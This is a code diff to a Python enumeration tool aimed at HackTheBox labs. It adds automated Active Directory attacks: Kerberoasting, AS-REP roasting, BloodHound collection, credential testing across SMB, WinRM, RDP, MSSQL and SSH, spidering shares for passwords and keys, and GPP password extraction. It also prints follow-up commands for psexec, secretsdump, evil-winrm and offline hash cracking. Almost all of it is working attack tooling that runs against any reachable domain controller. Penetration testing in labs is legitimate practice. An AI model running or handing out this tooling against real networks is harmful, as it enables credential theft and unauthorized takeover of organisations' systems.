@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 HTB Enumeration Tool v1.0
-Author: Automated Enumeration Script
+Author: @KhaosShield
 Description: Comprehensive enumeration tool for HackTheBox labs
 """
 
@@ -432,7 +432,7 @@ def nmap_detailed_scan(ports):
     
     port_list = ",".join(ports)
     
-    cmd = f"nmap -p {port_list} -sV -sC -A -Pn -T4 -oN {config.output_dir}/nmap_detailed.txt {config.target_ip}"
+    cmd = f"nmap -p{port_list} -sV -sC -A -Pn -T4 -oN {config.output_dir}/nmap_detailed.txt {config.target_ip}"
     console.print(f"\n[bold]Command:[/bold] [yellow]{cmd}[/yellow]")
     console.print("[dim]Running detailed service scan. [bold yellow]Press Ctrl+Z to skip this phase.[/bold yellow][/dim]\n")
     
@@ -1050,6 +1050,404 @@ def enumerate_active_directory():
                 console.print("[green]✓ AS-REP roastable accounts found![/green]")
                 import shutil
                 shutil.move("asrep_hashes.txt", f"{config.output_dir}/asrep_hashes.txt")
+        else:
+            # Try AS-REP roasting without credentials
+            enumerate_ad_asreproast_noauth()
+    
+    # Enhanced AD enumeration (only if credentials provided)
+    if username and password:
+        # Test credentials across all services
+        test_credentials_everywhere()
+        
+        # BloodHound collection
+        enumerate_ad_bloodhound()
+        
+        # Kerberoasting
+        enumerate_ad_kerberoasting()
+        
+        # Deep share enumeration
+        enumerate_ad_shares_deep()
+        
+        # GPP password extraction
+        enumerate_ad_gpp()
+
+# ============================================================================
+# ACTIVE DIRECTORY ADVANCED ENUMERATION
+# ============================================================================
+
+def enumerate_ad_bloodhound():
+    """Run BloodHound data collection"""
+    console.print("\n[bold cyan]═══ BloodHound Collection ═══[/bold cyan]")
+    
+    if not tool_exists('bloodhound-python'):
+        console.print("[yellow]bloodhound-python not found. Install: pip install bloodhound[/yellow]")
+        console.print("[dim]Skipping BloodHound collection[/dim]")
+        return
+    
+    run_bh = console.input("[bold yellow]Run BloodHound collection? (y/n):[/bold yellow] ").strip().lower()
+    if run_bh != 'y':
+        return
+    
+    username = console.input("[yellow]Username:[/yellow] ").strip()
+    password = console.input("[yellow]Password:[/yellow] ").strip()
+    domain = console.input("[yellow]Domain:[/yellow] ").strip()
+    
+    if not all([username, password, domain]):
+        console.print("[red]All fields required for BloodHound[/red]")
+        return
+    
+    console.print(f"\n[bold]Command:[/bold] [yellow]bloodhound-python -d {domain} -u {username} -p [REDACTED] -dc {config.target_ip} -c All --zip[/yellow]")
+    console.print("[dim]Collecting AD data. [bold yellow]Press Ctrl+Z to skip this phase.[/bold yellow][/dim]\n")
+    
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        console=console
+    ) as progress:
+        task = progress.add_task("[cyan]Collecting AD objects...", total=100)
+        
+        cmd = f"bloodhound-python -d {domain} -u {username} -p '{password}' -dc {config.target_ip} -c All --zip"
+        stdout, stderr, code = run_command(cmd, "BloodHound collection", timeout=600, show_command=False)
+        progress.update(task, completed=100)
+    
+    # Move files to output directory
+    import glob
+    import shutil
+    json_files = glob.glob("*.json")
+    zip_files = glob.glob("*bloodhound*.zip")
+    
+    moved_files = []
+    for f in json_files + zip_files:
+        try:
+            dest = os.path.join(config.output_dir, f)
+            shutil.move(f, dest)
+            moved_files.append(f)
+        except:
+            pass
+    
+    if moved_files:
+        console.print(f"\n[green]✓ BloodHound data collected![/green]")
+        for f in moved_files:
+            console.print(f"  • {f}")
+        console.print(f"\n[yellow]💡 Next Steps:[/yellow]")
+        console.print(f"   1. Open BloodHound GUI")
+        console.print(f"   2. Import: {config.output_dir}/*.json or .zip")
+        console.print(f"   3. Search for attack paths to Domain Admins")
+    else:
+        console.print("[yellow]No BloodHound data generated[/yellow]")
+
+def enumerate_ad_kerberoasting():
+    """Attempt Kerberoasting to find service accounts"""
+    console.print("\n[bold cyan]═══ Kerberoasting ═══[/bold cyan]")
+    
+    username = console.input("[yellow]Username (or press Enter to skip):[/yellow] ").strip()
+    if not username:
+        console.print("[dim]Skipping Kerberoasting (requires credentials)[/dim]")
+        return
+    
+    password = console.input("[yellow]Password:[/yellow] ").strip()
+    domain = console.input("[yellow]Domain:[/yellow] ").strip()
+    
+    if not all([password, domain]):
+        console.print("[yellow]Domain and password required, skipping...[/yellow]")
+        return
+    
+    kerberoast_found = False
+    
+    # Method 1: NetExec (preferred)
+    if tool_exists('netexec'):
+        console.print("[cyan]Attempting Kerberoasting with NetExec...[/cyan]")
+        
+        cmd = f"netexec ldap {config.target_ip} -u '{username}' -p '{password}' -d '{domain}' --kerberoasting kerberoast_hashes.txt"
+        stdout, stderr, code = run_command(cmd, "NetExec Kerberoasting", timeout=300)
+        
+        if os.path.exists("kerberoast_hashes.txt"):
+            import shutil
+            dest = os.path.join(config.output_dir, "kerberoast_hashes.txt")
+            shutil.move("kerberoast_hashes.txt", dest)
+            
+            with open(dest, 'r') as f:
+                hashes = f.read()
+                if "$krb5tgs$" in hashes:
+                    kerberoast_found = True
+                    hash_count = hashes.count("$krb5tgs$")
+                    console.print(f"[green]✓ Found {hash_count} Kerberoastable account(s)![/green]")
+                    
+                    # Show preview
+                    lines = hashes.split('\n')[:3]
+                    console.print(f"\n[dim]Preview:[/dim]")
+                    for line in lines:
+                        if line:
+                            console.print(f"  {line[:80]}...")
+                    
+                    console.print(f"\n[yellow]💡 Next Steps:[/yellow]")
+                    console.print(f"   hashcat -m 13100 {dest} /usr/share/wordlists/rockyou.txt")
+                    console.print(f"   john --wordlist=/usr/share/wordlists/rockyou.txt {dest}")
+    
+    # Method 2: Impacket (fallback)
+    if not kerberoast_found and tool_exists('impacket-GetUserSPNs'):
+        console.print("[cyan]Trying Impacket GetUserSPNs...[/cyan]")
+        
+        cmd = f"impacket-GetUserSPNs {domain}/{username}:'{password}' -dc-ip {config.target_ip} -request"
+        stdout, stderr, code = run_command(cmd, "Impacket Kerberoasting", timeout=300)
+        
+        if "$krb5tgs$" in stdout:
+            save_output("impacket_kerberoast.txt", stdout, command=cmd)
+            console.print("[green]✓ Kerberoast hashes found with Impacket[/green]")
+            kerberoast_found = True
+    
+    if not kerberoast_found:
+        console.print("[yellow]No Kerberoastable accounts found[/yellow]")
+
+def test_credentials_everywhere():
+    """Test credentials against all discovered services"""
+    if not config.credentials:
+        return
+    
+    console.print("\n[bold cyan]═══ Credential Validation ═══[/bold cyan]")
+    
+    # Parse credentials
+    if '/' in config.credentials:
+        domain_user, password = config.credentials.rsplit(':', 1)
+        if '/' in domain_user:
+            domain, username = domain_user.split('/', 1)
+        else:
+            domain = None
+            username = domain_user
+    else:
+        username, password = config.credentials.rsplit(':', 1)
+        domain = None
+    
+    console.print(f"[yellow]Testing: {domain+'/' if domain else ''}{username}[/yellow]\n")
+    
+    results = {}
+    
+    # Test SMB
+    if ('445' in config.discovered_ports or '139' in config.discovered_ports) and tool_exists('netexec'):
+        console.print("[cyan]→ Testing SMB...[/cyan]")
+        cmd = f"netexec smb {config.target_ip} -u '{username}' -p '{password}'"
+        if domain:
+            cmd += f" -d '{domain}'"
+        stdout, stderr, code = run_command(cmd, "SMB credential test", show_command=False)
+        
+        is_admin = "Pwn3d!" in stdout
+        is_valid = is_admin or "(+)" in stdout or "STATUS_SUCCESS" in stdout
+        results['SMB'] = ('Admin' if is_admin else 'Valid') if is_valid else 'Invalid'
+    
+    # Test WinRM
+    if ('5985' in config.discovered_ports or '5986' in config.discovered_ports) and tool_exists('netexec'):
+        console.print("[cyan]→ Testing WinRM...[/cyan]")
+        cmd = f"netexec winrm {config.target_ip} -u '{username}' -p '{password}'"
+        if domain:
+            cmd += f" -d '{domain}'"
+        stdout, stderr, code = run_command(cmd, "WinRM credential test", show_command=False)
+        
+        is_admin = "Pwn3d!" in stdout
+        is_valid = is_admin or "(+)" in stdout
+        results['WinRM'] = ('Admin' if is_admin else 'Valid') if is_valid else 'Invalid'
+    
+    # Test RDP
+    if '3389' in config.discovered_ports and tool_exists('netexec'):
+        console.print("[cyan]→ Testing RDP...[/cyan]")
+        cmd = f"netexec rdp {config.target_ip} -u '{username}' -p '{password}'"
+        if domain:
+            cmd += f" -d '{domain}'"
+        stdout, stderr, code = run_command(cmd, "RDP credential test", show_command=False)
+        is_valid = "(+)" in stdout or "Authentication successful" in stdout
+        results['RDP'] = 'Valid' if is_valid else 'Invalid'
+    
+    # Test MSSQL
+    if '1433' in config.discovered_ports and tool_exists('netexec'):
+        console.print("[cyan]→ Testing MSSQL...[/cyan]")
+        cmd = f"netexec mssql {config.target_ip} -u '{username}' -p '{password}'"
+        if domain:
+            cmd += f" -d '{domain}'"
+        stdout, stderr, code = run_command(cmd, "MSSQL credential test", show_command=False)
+        
+        is_admin = "Pwn3d!" in stdout
+        is_valid = is_admin or "(+)" in stdout
+        results['MSSQL'] = ('Admin' if is_admin else 'Valid') if is_valid else 'Invalid'
+    
+    # Test SSH (if domain machine has SSH)
+    if '22' in config.discovered_ports:
+        console.print("[cyan]→ Testing SSH...[/cyan]")
+        cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{config.target_ip} 'echo SUCCESS' 2>/dev/null"
+        stdout, stderr, code = run_command(cmd, "SSH credential test", show_command=False)
+        results['SSH'] = 'Valid' if 'SUCCESS' in stdout else 'Invalid'
+    
+    # Display results table
+    console.print(f"\n[bold cyan]Credential Test Results:[/bold cyan]")
+    table = Table(box=box.ROUNDED)
+    table.add_column("Service", style="cyan", width=12)
+    table.add_column("Status", style="yellow", width=15)
+    
+    admin_access = []
+    valid_access = []
+    
+    for service, status in results.items():
+        if status == 'Admin':
+            table.add_row(service, f"[red]✓ Admin Access[/red]")
+            admin_access.append(service)
+        elif status == 'Valid':
+            table.add_row(service, f"[green]✓ Valid[/green]")
+            valid_access.append(service)
+        else:
+            table.add_row(service, f"[dim]✗ Invalid[/dim]")
+    
+    console.print(table)
+    
+    # Provide recommendations
+    if admin_access or valid_access:
+        console.print(f"\n[yellow]💡 Recommended Actions:[/yellow]")
+        
+        if 'Admin' in results.get('SMB', ''):
+            console.print(f"   • [red]SMB Admin[/red] - Use psexec/secretsdump:")
+            console.print(f"     impacket-psexec {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}")
+            console.print(f"     impacket-secretsdump {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}")
+        
+        if 'Admin' in results.get('WinRM', '') or 'Valid' in results.get('WinRM', ''):
+            console.print(f"   • [green]WinRM Access[/green] - Use evil-winrm:")
+            console.print(f"     evil-winrm -i {config.target_ip} -u {username} -p '{password}'" + (f" -d {domain}" if domain else ""))
+        
+        if 'Admin' in results.get('MSSQL', '') or 'Valid' in results.get('MSSQL', ''):
+            console.print(f"   • [green]MSSQL Access[/green] - Use impacket-mssqlclient:")
+            console.print(f"     impacket-mssqlclient {domain+'/' if domain else ''}{username}:'{password}'@{config.target_ip}")
+        
+        if 'Valid' in results.get('SSH', ''):
+            console.print(f"   • [green]SSH Access[/green]:")
+            console.print(f"     ssh {username}@{config.target_ip}")
+        
+        if 'Valid' in results.get('RDP', ''):
+            console.print(f"   • [green]RDP Access[/green]:")
+            console.print(f"     xfreerdp /v:{config.target_ip} /u:{username} /p:'{password}'" + (f" /d:{domain}" if domain else ""))
+    
+    # Save results
+    save_output("credential_validation.txt", 
+                f"Tested: {domain+'/' if domain else ''}{username}\n\n" + 
+                "Results:\n" + 
+                "\n".join([f"{k}: {v}" for k, v in results.items()]))
+
+def enumerate_ad_shares_deep():
+    """Deep enumeration of SMB shares looking for sensitive files"""
+    console.print("\n[bold cyan]═══ Deep Share Enumeration ═══[/bold cyan]")
+    
+    username = console.input("[yellow]Username (or press Enter to skip):[/yellow] ").strip()
+    if not username:
+        console.print("[dim]Skipping (requires credentials)[/dim]")
+        return
+    
+    password = console.input("[yellow]Password:[/yellow] ").strip()
+    domain = console.input("[yellow]Domain (optional):[/yellow] ").strip()
+    
+    if not tool_exists('netexec'):
+        console.print("[yellow]NetExec not found, skipping[/yellow]")
+        return
+    
+    console.print("[cyan]Searching shares for interesting files...[/cyan]")
+    console.print("[dim]Looking for: passwords, configs, keys, scripts[/dim]\n")
+    
+    auth = f"-u '{username}' -p '{password}'"
+    if domain:
+        auth += f" -d '{domain}'"
+    
+    # Use spider_plus module to search
+    patterns = ["password", "secret", "credential", "key", ".xml", ".config", ".ini"]
+    
+    found_files = []
+    for pattern in patterns:
+        console.print(f"[cyan]→ Searching for: {pattern}[/cyan]")
+        cmd = f"netexec smb {config.target_ip} {auth} -M spider_plus -o READ_ONLY=false PATTERN='{pattern}'"
+        stdout, stderr, code = run_command(cmd, f"Share search: {pattern}", timeout=180, show_command=False)
+        
+        if stdout and ("Found" in stdout or ".json" in stdout):
+            save_output(f"share_search_{pattern}.txt", stdout, command=cmd)
+            found_files.append(pattern)
+    
+    if found_files:
+        console.print(f"\n[green]✓ Found interesting files matching: {', '.join(found_files)}[/green]")
+        console.print(f"[yellow]💡 Review files in: {config.output_dir}/share_search_*.txt[/yellow]")
+    else:
+        console.print("[yellow]No sensitive files found in readable shares[/yellow]")
+
+def enumerate_ad_gpp():
+    """Check for Group Policy Preferences passwords"""
+    console.print("\n[bold cyan]═══ GPP Password Extraction ═══[/bold cyan]")
+    
+    username = console.input("[yellow]Username (or press Enter to skip):[/yellow] ").strip()
+    if not username:
+        console.print("[dim]Skipping (requires credentials)[/dim]")
+        return
+    
+    password = console.input("[yellow]Password:[/yellow] ").strip()
+    domain = console.input("[yellow]Domain:[/yellow] ").strip()
+    
+    if not tool_exists('netexec'):
+        console.print("[yellow]NetExec not found, skipping[/yellow]")
+        return
+    
+    console.print("[cyan]Checking SYSVOL for GPP passwords...[/cyan]")
+    
+    cmd = f"netexec smb {config.target_ip} -u '{username}' -p '{password}' -d '{domain}' -M gpp_password"
+    stdout, stderr, code = run_command(cmd, "GPP Password search", timeout=120)
+    
+    if "cpassword" in stdout.lower() or "password" in stdout.lower():
+        console.print("[green]✓ GPP passwords found in SYSVOL![/green]")
+        save_output("gpp_passwords.txt", stdout, command=cmd)
+        
+        # Extract and show any found passwords
+        passwords = re.findall(r'Password.*?:\s*(.+)', stdout, re.IGNORECASE)
+        if passwords:
+            console.print(f"\n[yellow]💡 Found credentials:[/yellow]")
+            for pwd in passwords[:5]:  # Show first 5
+                console.print(f"   • {pwd}")
+    else:
+        console.print("[yellow]No GPP passwords found[/yellow]")
+
+def enumerate_ad_asreproast_noauth():
+    """Attempt AS-REP roasting without authentication"""
+    console.print("\n[bold cyan]═══ AS-REP Roasting (No Auth) ═══[/bold cyan]")
+    
+    if '88' not in config.discovered_ports:
+        console.print("[dim]Kerberos port 88 not open, skipping[/dim]")
+        return
+    
+    domain = config.discovered_hosts[0].split('.')[-2:] if config.discovered_hosts else None
+    if domain and isinstance(domain, list):
+        domain = '.'.join(domain)
+    
+    if not domain:
+        domain = console.input("[yellow]Domain name (e.g., htb.local):[/yellow] ").strip()
+        if not domain:
+            console.print("[dim]Domain required, skipping[/dim]")
+            return
+    
+    if tool_exists('impacket-GetNPUsers'):
+        console.print(f"[cyan]Checking for AS-REP roastable accounts on {domain}...[/cyan]")
+        
+        # Try with common usernames
+        output_file = os.path.join(config.output_dir, "asreproast_nousers.txt")
+        cmd = f"impacket-GetNPUsers {domain}/ -dc-ip {config.target_ip} -request -format hashcat -outputfile {output_file}"
+        stdout, stderr, code = run_command(cmd, "AS-REP roast (no auth)", timeout=60, show_command=False)
+        
+        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
+            with open(output_file, 'r') as f:
+                content = f.read()
+                if "$krb5asrep$" in content:
+                    console.print("[green]✓ Found AS-REP roastable accounts![/green]")
+                    console.print(f"\n[yellow]💡 Crack hashes:[/yellow]")
+                    console.print(f"   hashcat -m 18200 {output_file} /usr/share/wordlists/rockyou.txt")
+                else:
+                    console.print("[yellow]No AS-REP roastable accounts found[/yellow]")
+        else:
+            console.print("[yellow]No AS-REP roastable accounts found[/yellow]")
+    else:
+        console.print("[dim]impacket-GetNPUsers not found, skipping[/dim]")
+
+# ============================================================================
+# PROTOCOL-SPECIFIC ENUMERATION
+# ============================================================================
 
 def enumerate_additional_services():
     """Enumerate other discovered services"""
